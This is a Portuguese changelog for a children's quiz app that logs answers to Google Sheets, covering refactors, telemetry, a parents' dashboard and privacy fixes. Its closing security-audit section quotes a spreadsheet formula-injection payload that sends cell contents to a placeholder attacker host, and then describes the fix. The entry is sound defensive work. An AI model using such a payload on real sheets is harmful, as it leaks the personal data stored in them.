# Changelog

## 2026-08-24 — Repositório e circuito de ponta a ponta

Protótipo monolítico virou base reaproveitável. Nenhuma prova nova.

**Repositório**
- `git init`, commit inicial com motor, primeira prova e convenções.
- `docs/` versionado de propósito: é a saída publicada pelo GitHub Pages.

**Dados (etapa 0)** — `59c87f0`
- `regra` repopulada nas 7 missões. Vinham `null` desde a extração do monolito:
  o texto do cartão de regra só existia dentro do motor.
- `PASSOS` virou `questao.passos`, ancorado no `questao_id` em vez do índice.
- `{{GRAFICO_LIVROS}}` eliminado. `figura` virou objeto tipado:
  `{tipo:'barras',fonte:'missao'}` lê `missao.dados.serie`; `{tipo:'svg',...}`
  cobre desenhos avulsos.
- `build.mjs` recusa missão sem regra, passos malformados e figura desconhecida.

**Motor lê o JSON (etapa 1)** — `cc28cf6`
- Saiu o array `modules` com as 7 missões embutidas; entra `<script id="prova-data">`.
- `modules.reverse()` removido — a ordem é decidida na criação da prova.
- Vocabulário do motor passa a ser o do JSON.
- `KEY` e `FILA` incluem `prova_id`.
- Rótulos e contagens derivam de `missoes.length` e dos metadados.
- Guarda dupla para ferramenta inexistente: no build e no runtime.

**Telemetria por questão (etapa 2)** — `484ac0c`
- Uma linha por questão respondida, 28 campos da seção 5 do CLAUDE.md.
- Saem as linhas de resumo por missão e por jornada.
- Tempo até o primeiro toque e total; `tempo_valido=false` com saída de tela
  (Page Visibility) ou acima de 3 min. Nada disso aparece na tela.
- `sessao_id` sobrevive a fechar a aba; voltar marca `retomada=true`.
- `SHEET_URL` sai do código e passa a ser injetada por `build.mjs` do ambiente.
- `apps-script/enviar.gs` reescrito, com dedup por `evento_id`.
- Corrigido: a fila só era drenada em abertura do zero, nunca numa retomada.
- Corrigido: medalha e bônus assumiam 3 questões por missão.

**Verificado no navegador** (`node scripts/servir.mjs`)
Ordem das missões, aula fatiada, ferramenta interativa, cartão de regra com
texto, andaime uma etapa por vez, dois toques, 2ª tentativa, escudo, modo foco,
pausa na 2ª e 4ª missão, retomada após recarregar, e as 21 linhas de uma
jornada completa com as 28 colunas batendo com as do Apps Script.

**Não verificado por mim**: gravação real na planilha (depende da implantação
do Apps Script) e comportamento no aparelho da Alícia.

## 2026-08-24 — Correções e identidade do usuário

- **fix**: `isOpen()` lia `missoes[i-1].id`, campo extinto na etapa 1. Nenhuma missão
  destravava depois da primeira. `build.mjs` passa a recusar vocabulário extinto.
- **fix**: "Copiar resultados" duplicava tudo que foi respondido depois da última
  recarga — cada linha vive na fila E na lista da aba. Agora deduplica por `evento_id`.
  O envio à planilha nunca teve esse problema.
- **feat**: sair da missão pelo mapa, descartando o parcial. XP e telemetria ficam.
- **feat**: `prova.alunas` (lista) substitui `prova.aluna`. O motor pergunta uma vez
  por aparelho quem está estudando e grava na coluna `aluna`. Motivo: teste de adulto
  gravado no nome dela envenena a calibragem — responde rápido demais e acerta demais.
- Planilha criada no Drive: "Missão Estudos — log de questões", em
  01. Família & Pessoas › 04. Alícia › Educação. Nome neutro porque a recomendação é
  **uma base para as duas filhas**, separadas pela coluna `aluna`.

## 2026-08-24 — Publicação e dashboard dos pais

- Repo público em github.com/mattusca/missao-estudos; Pages servindo `docs/` com
  `noindex` + robots.txt. Histórico reescrito ANTES do push para remover o
  contexto clínico do CLAUDE.md → `CONTEXTO-PRIVADO.md` (gitignorado).
- **feat**: dashboard de acompanhamento (`apps-script/dashboard.html`), servido
  pelo Apps Script em segunda implantação; acesso = compartilhamento da planilha.
  Por tema: acerto sem apoio com estado "ainda não sei" (<10 eventos ou <3
  sessões), evolução por sessão, barras por dificuldade, contagem de apoios.
  Uma aluna por vez; `(teste)` filtrado no servidor e no cliente.
- `scripts/preview-dash.mjs`: preview com dados sintéticos (4 estados do card +
  linha de teste a filtrar), verificado no navegador. Saída no temp, nunca em docs/.
- **ci**: `.github/workflows/publicar.yml` — build de todas as provas com a
  `SHEET_URL` vinda de secret e publicação no Pages. Fonte do Pages migrada de
  "branch main /docs" para "GitHub Actions". Publicar passou a ser dar push.
- `docs/` saiu do versionamento (`.gitignore`): era a única via pela qual a URL
  do Apps Script voltaria a um repositório público. Um passo do Action aborta a
  publicação se uma URL real de implantação aparecer em arquivo versionado —
  o `{30,}` no padrão separa URL real dos placeholders da documentação.
- `lerEventos_` passa a mapear pelo cabeçalho da planilha, não pela posição fixa:
  uma coluna movida à mão faria o dash ler o campo errado em silêncio.

## 2026-08-24 — Correcao da barra de XP

- **fix**: `.hud .xpfill` era um `<span>` inline, e em elemento inline `width` e
  `height` nao se aplicam: a barra ficava 0x0. O numero de XP subia e a barra ao
  lado ficava vazia em qualquer nivel, desde o prototipo. `display:block` resolve.
  Verificado no navegador: 0%/50%/100% respondem (0 / 79 / 158 px num trilho de 160).

## 2026-08-24 — Prova de Language Arts Y5

Segunda prova do sistema, primeira fora de matemática. Base: roteiro da
professora, prova em 26/08.

**Motor** — 4 ferramentas de língua, genéricas e parametrizadas por `missao.dados`
como o `grafico`. A próxima prova de língua não deve precisar tocar no motor.
- `conector` — troca a palavra do meio e o sentido muda junto.
- `destacar` — toca frases do texto e vê a função de cada uma.
- `montar` — fichas embaralhadas para ordenar. Duas granularidades: palavras
  (gramática) e frases inteiras (sequência narrativa).
- `transformar` — toca a palavra e ela cicla entre as formas.
- Cartão de regra passa a renderizar `dados.texto` abaixo da regra. O texto de
  leitura vive num lugar só, pelo mesmo motivo da série do gráfico.

**Corrigido durante o teste**
- `montar` entregava as fichas na ordem correta: resolvia sozinho da esquerda
  para a direita e não ensinava nada. Agora embaralha, e regira se o sorteio
  cair na ordem certa.
- No celular o texto de leitura empurrava a 1ª alternativa para baixo da dobra
  (y=776 numa tela de 812) — ela teria de rolar até o fim para escolher e voltar
  ao topo para reler, que é a carga que o cartão fixo existe para tirar. Teto de
  altura com rolagem interna: 53% → 37% da tela. No tablet cabe tudo numa tela.

**Conteúdo** — 7 missões, 21 questões, gabarito 5/5/6/5, dificuldade média 1.81.
Enunciados em inglês, andaime em português: o apoio existe para tirar carga, e em
L2 viraria mais uma coisa a decodificar. `Writing: Narrative` não cabe em múltipla
escolha e virou *narrative craft* — sequência, abertura, show vs tell.

**Privacidade** — `escola` passa de "Pueri Domus" para o código `"PD"`. O nome
estava no JSON versionado e na página publicada, ao lado do primeiro nome e do ano.
Ressalva: o histórico do Git já o contém desde o primeiro push.

**Verificado no navegador** — as 4 ferramentas respondendo ao toque; gate do mapa
destravando só a missão seguinte (testado pelo mapa, não por `openModule`); dois
toques; 2ª tentativa sem revelar gabarito; escudo; andaime um passo por toque;
modo foco; retomada com XP, medalhas, foco e identidade; jornada completa com 21
linhas de 28 colunas, `bncc: null` e `escola: PD`.

**BNCC** — Língua Inglesa só existe na BNCC a partir do 6º ano. Os 7 temas `ING.*`
entram com `habilidade_bncc: null`, não com código inventado.

## 2026-08-24 — Identidade primeiro, progresso por pessoa

- **feat**: "Quem está estudando?" passa a ser a primeira tela de toda sessão, não
  só da estreia do aparelho. Com Marco e Fernanda testando no mesmo tablet da
  Alícia, perguntar uma vez gravaria linha no nome errado. O último nome escolhido
  vem marcado ("última vez"), então o caminho de sempre continua custando um toque.
- **fix**: progresso era por prova e por APARELHO — `missao_progresso_<prova>_v2`.
  Os três dividiam o mesmo XP, medalhas e mapa. Um teste de adulto entregaria à
  Alícia o jogo já ganho: 7 medalhas e o mapa inteiro aberto antes de ela começar.
  A chave passa a incluir a pessoa e virou função, porque só pode ser resolvida
  depois da escolha. Trocar de pessoa recarrega o estado dela, não só redesenha o mapa.
- **fix**: o HUD aparecia sobre a tela de escolha mostrando "Nível 1 · 0 XP" —
  placar de ninguém, que ainda mudava sozinho quando o progresso carregava.

**Verificado no navegador** — Marco joga a missão 1 (480 XP, 1 medalha); Alícia abre
e encontra 0 XP, nenhuma medalha e 6 de 7 travadas; voltando ao Marco, os 480 XP e a
missão 2 aberta reaparecem. Duas chaves separadas no localStorage. Nas duas provas.

## 2026-08-25 — Circuito fechado de ponta a ponta

Marco implantou o Apps Script (duas implantações) e a `SHEET_URL` entrou como
secret do repositório. O build passou a imprimir "envio para a planilha: ATIVO".

**Verificado de ponta a ponta, na página publicada**
- Ping da telemetria responde; o gate do `doGet` recusa servir o dashboard pela
  URL pública, como projetado.
- Dashboard anônimo → 302 para o login do Google. O acesso é o compartilhamento
  da planilha, não senha no código.
- Questão respondida no navegador vira linha na aba `Eventos`: cabeçalho
  autogerado com as 28 colunas e o evento completo (`Marco (teste)`,
  `ING.ESC.CONECT.Q1`, `acerto_1a`, `escola PD`, `BNCC` vazio).
- Tempo até o 1º toque medido corretamente: 4,2 s para uma pausa de 4,2 s.
  O `0` da primeira linha era clique automático instantâneo, não defeito.
- A URL está na página publicada e **não** no repositório — `git grep` limpo.

Ficam na planilha 2 linhas de `Marco (teste)` deste teste. São filtradas no
dashboard (servidor e cliente) e não entram na calibragem.

## 2026-08-25 — Auditoria de injection

Revisão dos pontos onde dado externo vira HTML ou célula de planilha.

- **fix (sério)**: injeção de fórmula no Sheets. O `doPost` é público de
  propósito e a URL está no HTML publicado — qualquer um que veja o fonte da
  página consegue gravar linhas. O Sheets trata string começada por `= + - @`
  como fórmula, então dava para plantar `=IMAGE("http://atacante/"&A2)`: o
  Sheets buscaria a imagem e o conteúdo da célula sairia dentro da URL do
  request. Numa planilha com nome e desempenho de crianças, isso é vazamento.
  `celula_` passa a prefixar apóstrofo nesses casos e a limitar strings a 300
  caracteres. Números e booleanos passam intactos.
- **fix**: `</script>` dentro do JSON da prova fecharia a tag cedo no
  `build.mjs`, transformando o resto em HTML executável. O JSON contém HTML de
  propósito (regra, aula), então é armadilha para nós mesmos no dia em que uma
  questão precisar falar da tag. `<` vira `\u003c`; o `JSON.parse` desfaz.
  O `<title>` também passou a ser escapado. O dashboard já fazia isso.

**Sem achado**: o dashboard escapa todo campo de texto vindo da planilha
(`aluna`, `materia`, `tema_id`, `subtema`); os demais são números calculados.
As ferramentas de língua usam `textContent`, não `innerHTML`. Bloquear linha
legítima via dedup é impraticável — `evento_id` carrega id aleatório.

**Risco aceito e conhecido**: qualquer um com a URL pode gravar linhas
plausíveis (poluir o log). Não há como autenticar sem pôr segredo no HTML
público, o que não resolveria nada. A coluna `aluna` e o filtro `(teste)`
limitam o estrago à calibragem, não ao acesso.
